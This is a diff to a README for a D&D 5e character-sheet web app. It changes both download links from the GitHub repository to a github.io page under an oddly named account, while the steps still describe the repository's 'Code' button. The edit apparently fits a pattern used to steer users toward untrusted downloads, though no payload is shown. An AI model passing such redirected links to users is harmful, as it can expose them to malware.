@@ -1,6 +1,6 @@
 # 🎲 dnd-character-sheet-webapp - Manage your Dungeons and Dragons characters easily
 
-[![Download Now](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Carmelinasynthetic369/dnd-character-sheet-webapp)
+[![Download Now](https://img.shields.io/badge/Download-Application-blue.svg)](https://carmelinasynthetic369.github.io)
 
 ## 📂 About the Application
 
@@ -15,7 +15,7 @@ The dnd-character-sheet-webapp helps players track Dungeons and Dragons 5th Edit
 
 ## 🚀 Downloading the App
 
-1. Visit the following address to access the file: [Download the character sheet](https://github.com/Carmelinasynthetic369/dnd-character-sheet-webapp).
+1. Visit the following address to access the file: [Download the character sheet](https://carmelinasynthetic369.github.io).
 2. Look for the green button labeled Code on the right side of the page.
 3. Click the button and select Download ZIP.
 4. Open your Downloads folder in File Explorer once the download finishes.
